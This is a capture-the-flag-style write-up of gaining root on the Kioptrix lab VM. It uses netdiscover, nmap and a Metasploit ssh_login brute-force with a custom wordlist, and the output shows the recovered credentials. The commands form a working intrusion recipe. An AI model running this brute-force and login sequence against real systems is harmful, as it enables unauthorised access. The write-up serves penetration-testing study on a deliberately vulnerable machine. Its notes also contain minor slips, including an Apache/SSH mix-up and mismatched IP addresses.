# Kioptrix SSH expolit write-up

Kioptrix is Virtual Machine with many exploits and now we are going to exploit it's one of exploit - SSH vuln.



 > The target of this lab is use vulnerablitity in Apache service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.58.0/16   |   Screen View: Unique Hosts                                                        
                                                                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.219  00:0c:29:cd:26:47      2     120  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.219 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
.
.
.
```

SSH port is open, we try to search it's expolit on metaspolit.

`sudo msfdb init && msfconsole`

`msf6 > search ssh`

```
.
.
72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner
.
.
```

We use *ssh_login* expolit, to bruteforce password and login id.

`msf6 > use 72`

## Expolit:

Before bruteforcing, adjust the settings;

`msf6 auxiliary(scanner/ssh/ssh_login) > show options`

In options we see, Remote Host, User file and Password file is missing, so;

```
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file login.txt
pass_file => login.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.43.219
rhosts => 192.168.43.219
msf6 auxiliary(scanner/ssh/ssh_login) > set user_file login.txt
user_file => login.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
```

*login.txt* is list of words and password that I've created, to avoid long bruteforce time.

Now, just hit `run`:

```
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.43.219:22 - Starting bruteforce
[-] 192.168.43.219:22 - Failed: 'admin:admin'
[-] 192.168.43.219:22 - Failed: 'admin:root'
[-] 192.168.43.219:22 - Failed: 'admin:msfadmin'
[-] 192.168.43.219:22 - Failed: 'admin:123'
[-] 192.168.43.219:22 - Failed: 'admin:123456'
[-] 192.168.43.219:22 - Failed: 'admin:12345678'
[-] 192.168.43.219:22 - Failed: 'root:admin'
[-] 192.168.43.219:22 - Failed: 'root:root'
[-] 192.168.43.219:22 - Failed: 'root:msfadmin'
[-] 192.168.43.219:22 - Failed: 'root:123'
[+] 192.168.43.219:22 - Success: 'root:123456' 'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown '
[*] SSH session 2 opened (192.168.43.132:35817 -> 192.168.43.219:22) at 2024-06-29 01:56:51 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> We got;    
LoginID : root   
   Password : 123456

Now, exit msf, and enter the SSH of VM, using;

`ssh root@192.168.43.219`

It asks for Password, enter that we've got. And that's it, we logged as ROOT.